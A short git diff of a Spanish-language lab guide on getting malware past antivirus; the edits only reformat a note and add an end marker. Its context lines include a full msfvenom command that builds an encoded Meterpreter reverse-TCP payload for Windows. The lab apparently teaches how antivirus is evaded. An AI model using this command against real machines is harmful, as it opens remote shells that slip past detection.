@@ -87,7 +87,7 @@ A la pregunta: ***Enable Stealth Mode***, que aplica ofuscación al malware, con
 A la pregunta: ***Used a listed payload or custom***, contestamos ***C***. 
 
 Vamos a usar ***msfvenom*** para crear el payload. Así, abrimos una nueva terminal y en ella escribimos.
-Nota: El payload se almacena en la ruta ***~/malware/payload.raw***.
+(Nota: El payload se almacena en la ruta ***~/malware/payload.raw***.)
 ```
 sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f raw -o /home/antonio/malware/payload.raw
 ```
@@ -236,14 +236,4 @@ Y los afortunados fueron...
 
 ¿Sigues pensando que tu antivirus es perfecto? ;)
 
-
-
-
-
-
-
-
-
-
-
-
+***FIN DEL LABORATORIO***
